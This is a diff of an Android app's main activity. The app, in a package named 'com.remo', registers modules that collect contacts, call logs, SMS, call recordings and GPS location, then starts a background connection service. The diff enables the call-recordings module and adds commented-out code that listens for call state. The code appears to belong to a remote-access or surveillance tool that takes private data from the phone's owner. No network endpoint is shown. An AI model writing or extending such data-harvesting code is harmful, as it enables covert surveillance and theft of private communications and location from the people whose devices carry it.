@@ -1,32 +1,13 @@
 package com.remo;
 
 import android.app.Activity;
-import android.app.KeyguardManager;
-import android.app.admin.DevicePolicyManager;
 //import android.content.Context;
-import android.content.ComponentName;
-import android.content.Context;
 import android.content.Intent;
-import android.net.ConnectivityManager;
-import android.os.Build;
 import android.os.Bundle;
-import android.os.PowerManager;
 import android.os.StrictMode;
-import android.telephony.TelephonyManager;
 import android.util.Log;
-import android.view.Window;
-import android.view.WindowManager;
-import com.remo.Connections.DataHandler;
-import com.remo.Connections.Feature;
-import com.remo.Connections.MainConnectionService;
-import com.remo.Features.*;
-import dalvik.system.DexFile;
-
-import java.lang.reflect.*;
-
-import java.io.IOException;
-import java.util.ArrayList;
-import java.util.Enumeration;
+import com.remo.connections.DataHandler;
+import com.remo.features.*;
 
 public class MainActivity extends Activity {
 
@@ -53,14 +34,17 @@ public class MainActivity extends Activity {
         DataHandler.FeaturesClassesDict.put(DataHandler.eDataType.CONTACTS.ordinal(),Contacts.class);
         DataHandler.FeaturesClassesDict.put(DataHandler.eDataType.CALL_LOG.ordinal(),Call_Log.class);
         DataHandler.FeaturesClassesDict.put(DataHandler.eDataType.SMS.ordinal(),SMS.class);
-        //DataHandler.FeaturesClassesDict.put(DataHandler.eDataType.CALL_RECORDS.ordinal(),CALL_RECORDS.class);
+        DataHandler.FeaturesClassesDict.put(DataHandler.eDataType.CALL_RECORDS.ordinal(),CallRecordsList.class);
         DataHandler.FeaturesClassesDict.put(DataHandler.eDataType.GPS.ordinal(),GPS.class);
 
+//        CallRecorder phoneListener = new CallRecorder();
+//        TelephonyManager telephonyManager = (TelephonyManager) this
+//                .getSystemService(Context.TELEPHONY_SERVICE);
+//        telephonyManager.listen(phoneListener,
+//                PhoneStateListener.LISTEN_CALL_STATE);
 
 
-
-
-        startService(new Intent(getApplicationContext(), com.remo.Connections.MainConnectionService.class));
+        startService(new Intent(getApplicationContext(), com.remo.connections.MainConnectionService.class));
 
 
 
@@ -71,7 +55,7 @@ public class MainActivity extends Activity {
 
 //        Field[] aClassFields = .getDeclaredFields();
 //        for(Field f : aClassFields){
-//            // Found a field f
+//            // Found getSize field f
 //        }
 
 
